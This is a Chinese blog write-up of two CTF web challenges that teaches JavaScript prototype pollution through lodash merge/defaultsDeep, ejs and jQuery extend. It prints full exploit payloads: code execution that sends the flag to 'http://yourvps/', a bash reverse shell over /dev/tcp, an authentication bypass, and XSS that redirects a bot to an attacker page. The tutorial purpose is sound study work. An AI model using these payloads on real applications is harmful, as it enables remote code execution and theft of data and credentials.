---
layout: post
title: 从两道例题学习JS原型链污染
tags: Web安全 CTF
typora-root-url: ..
---

JS原型链污染也是最近比较常考的知识点之一，学习其原理和方式对于了解JS也比较有帮助，分析了两道例题，ph师傅的题是比较经典的原型链污染，漏洞点和利用点都出自框架。XNUCA的题比较巧妙，特别是其前后端结合利用的方式，出题思路还是很棒的。

[TOC]

### 0x01 理论知识

几个关键点：

- 类是利用构造函数（即function）定义，并且可以认为在function中直接定义的属性`this.example =  `这种类型的定义可以理解为是绑定在实例上的，每个实例独有。而为了实现继承的效果，需要可以绑定到类上的field,类似于Java中的static。

  这里就是利用原型`prototype`，prototype可以认为是一个static域，这个域里面的field都是绑定到类上的

  而这个prototype是绑定到一个类上的，是类的属性，相对应的存在`__proto__`是绑定到这个类的实例上的 

  ```javascript
  foo.__proto__ == Foo.prototype
  ```

- 首先所有类的对象在实例化的过程中会自动拥有prototype中的所有field，利用这一点来实现继承，我们只要将一个对象(父类)传递给prototype就可以。而对于一个对象实例，可以通过改变他的`__proto__`来实现继承

- 我们改变一个对象的`__proto__`就可以改变这个类的prototype（根据指向关系）,这样就可以操纵这个类的属性了

- 需要注意经常会出现原型链污染的情况

  1. merge

     ```javascript
  function merge(target, source) {
      for (let key in source) {
          if (key in source && key in target) {
              merge(target[key], source[key])
          } else {
              //属性键可控
              target[key] = source[key]
          }
      }
  }
     ```

  但是如果我们直接创建对象，`__proto__`会被直接认为是原型，所以这里应该使用`JSON.parse('{"a":1,"__proto__":{"b":2}}')`

  2. 和merge类似的clone操作

### 0x02 例题

#### code-breaking 2018 thejs

核心功能代码：

```javascript
app.all('/', (req, res) => {
    let data = req.session.data || {language: [], category: []}
    if (req.method == 'POST') {
        data = lodash.merge(data, req.body)
        req.session.data = data
    }
    
    res.render('index', {
        language: data.language, 
        category: data.category
    })
})
```

会将post的数据和之前的数据合并，存放到session中。经过测试发现这里的merge存在原型链污染问题，如何利用呢？这里还使用了lodash的template功能来实现

```javascript
app.engine('ejs', function (filePath, options, callback) { // define the template engine
    fs.readFile(filePath, (err, content) => {
        if (err) return callback(new Error(err))
        let compiled = lodash.template(content)
        let rendered = compiled({...options})

        return callback(null, rendered)
    })
})
```

查看[loadsh.template/index.js](https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089)寻找可利用的点，这里调用了sourceURL来构造Function

```javascript
 var result = attempt(function() {
    return Function(importsKeys, sourceURL + 'return ' + source)
      .apply(undefined, importsValues);
  });
//sourceURL definition
var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';
```

可以看到这里我们可以控制sourceURL，就可以控制Function的构造，从而执行任意代码。

> 我们在寻找可利用点的时候，一般在template这种功能中，可利用点较多，因为会不可避免出现执行代码拼接。

```javascript
//# sourceURL= test\r\n[CODE]\n
```

这里我们无法在Function中直接引入require，require() 并不是一个全局的函数，所以我们先引入require

```javascript
var require = global.require || global.process.mainModule.constructor._load;
var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();
//发送结果
var req = require('http').request(`http://yourvps/${result}`);req.end();
```

最终的payload

```
{"__proto__":{"sourceURL":"test\r\nvar require = global.require || global.process.mainModule.constructor._load;
var result = require('child_process').execSync('cat /flag_thepr0t0js').toString();
var req = require('http').request(`http://yourvps/${result}`);req.end();\n"}}
```

#### XNUCA hardJS

[题目源码](https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs)

##### 后端原型链污染

server.js在内容大于5的时候有一个合并的逻辑，调用的是loadsh的defaultDeep
这里有一个CVE-2019-10744，版本也符合，说明存在原型链污染

```javascript
for(var i=0;i<raws.length ;i++){
            lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));
            var sql = "delete from `html` where id = ?";
            var result = await query(sql,raws[i].id);
        }
```

调试了一波发现，这个漏洞直接使用`__proto__`并不能触发，使用了safeGet，过滤掉了`__proto__`,但是没有过滤`constructor`，constructor其实就是指向类的一个引用，那么constructor的prototype属性其实就是`__proto__`属性

这里我们可以造成原型链污染，只要寻找一个可利用的点就行，后端来说对于模板引擎经常会有可以利用的点，debug调一下，沿着调用链一直跟进

![](https://litch1-1256735124.cos.ap-beijing.myqcloud.com/20200213233445.png)

发现

![](https://litch1-1256735124.cos.ap-beijing.myqcloud.com/20200213233802.png)

这里就是我们可以利用的点，outputFunctionName来源于opts也就是我们传入模版渲染的值，我们在中间拼接入代码便可以造成RCE

最后的payload（反弹shell）

```json
{
    "content": {
        "constructor": {
            "prototype": {
            "outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/xxx/xx 0>&1\"');var __tmp2"
            }
        }
    },
    "type": "test"
}
```

##### 前后端结合利用

因为这个题目给了robot.py 可以考虑是否存在xss的利用方式，robot的密码为flag，他会通过input自动填写，第一个问题就是如何让机器人顺利登陆

```javascript
function auth(req,res,next){
    // var session = req.session;
    if(!req.session.login || !req.session.userid ){
        res.redirect(302,"/login");
    } else{
        next();
    }    
}
```

我们只要添加login以及userid属性就可以绕过这个认证

```json
{
    "content": {
        "constructor": {
            "prototype": {
  				{"login":true,"userid":1}
            }
        }
    },
    "type": "test"
}
```

还得寻找一个前端的原型链污染的漏洞，CVE-2019-11358，这里是在前端获取data的时候，其实这里的实现还是比较可疑的，所以比较容易发现，利用的方式和后端类似。

```javascript
for(var i=0 ;i<datas.length; i++){
				$.extend(true,allNode,datas[i])
			}
```

接着我们要考虑去伪造input框，当前的处理逻辑在app.js,渲染html的时候是利用sandbox取值来渲染的

```javascript
addEventListener('message', (evt) => {

		if (evt.origin == origin) {
			const viewport = document.querySelector('#viewport');
			if(evt.data.cmd == 'render' ){
				while (viewport.children[0]) {
					viewport.children[0].remove();
				}
				var dom = evt.data.dom ;
				for (key in dom){
					switch(key){
						case 'header':
							$tmp = $("li[type='header']");
							$newNode = $( $tmp.html() );
							$newNode.find("span.content").html(dom[key][0]);
							// console.log($newNode.html());
							viewport.appendChild( $newNode[0] );
							break;
                         //其他的case省略
					}
				}
				
			}
        }
      });
```

取出message的内容根据key来给`span.content`赋值，但是可以发现这里在构建iframe的时候

```javascript
this.sandbox.setAttribute('sandbox', 'allow-same-origin');
```

>sandbox具有如下特性
>
>- 访问父页面的DOM（从技术角度来说，这是因为相对于父页面iframe已经成为不同的源了）
>- 执行脚本
>- 通过脚本嵌入自己的表单或是操纵表单
>- 对cookie、本地存储或本地SQL数据库的读写

所以我们并无法在sandbox中执行脚本，需要在外部找寻一个利用点

```javascript
(function(){
		var hints = {
			header : "自定义内容",
			notice: "自定义公告",
			wiki : "自定义wiki",
			button:"自定义内容",
			message: "自定义留言内容"
		};
		for(key in hints){
			// console.log(key);
			element = $("li[type='"+key+"']"); 
			if(element){
				element.find("span.content").html(hints[key]);
			}
		}
	})();
```

要是我们可以操纵hints中的key和value就可以额操纵一个`li`标签来实现xss，需要这个type不在预先定义的hints中，但是又存在于html中，而在index.ejs中可以发现还真有这样的type，标准的诈胡

![](https://litch1-1256735124.cos.ap-beijing.myqcloud.com/20200215010233.png)

这样我们就可以操作这里完成我们的xss了，最后官方给的前端payload

```
{"type":"test","content":{"__proto__": {"logger": "<script>window.location='http://yourip/hack.html'</script>"}}}
```

在hack.html中自定义input和form让robot提交就可以获得flag